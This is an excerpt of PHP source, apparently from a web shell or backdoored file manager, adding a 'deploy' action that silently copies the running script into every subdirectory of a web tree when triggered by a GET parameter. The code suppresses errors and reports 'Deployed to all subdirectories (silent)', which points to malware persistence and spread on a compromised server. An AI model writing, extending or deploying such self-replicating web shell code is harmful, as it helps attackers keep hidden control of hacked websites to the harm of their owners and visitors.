...
// ========== NEW: Auto-deploy script to all subdirectories ==========
function deployScriptRecursive($rootDir, $sourceFile) {
    ...
    // Copy into the root directory itself (skip if it's the same file)
    $rootTarget = $rootDir . '/' . $targetName;
    $rootTargetReal = @realpath($rootTarget);
    if (!$rootTargetReal || $rootTargetReal !== $sourceReal) {
        @copy($sourceFile, $rootTarget);
    }
    
    // Recursively traverse all subdirectories
    $items = scanPath($rootDir);
    foreach ($items as $item) {
        $fullPath = $rootDir . '/' . $item;
        if (@is_dir($fullPath) && !@is_link($fullPath)) {
            deployScriptRecursive($fullPath, $sourceFile);
        }
    }
}
// ========== END NEW FUNCTION ==========
...
if(isset($_GET['do'])) {
    ...
    // ========== NEW: Auto-deploy action ==========
    if($action === 'deploy') {
        $sourceScript = __FILE__;
        // Start deployment from current displayed path
        deployScriptRecursive(rtrim($currentPath, '/'), $sourceScript);
        $notification = ['type' => 'success', 'text' => 'Deployed to all subdirectories (silent)'];
    }
    // ========== END NEW ACTION ==========
}
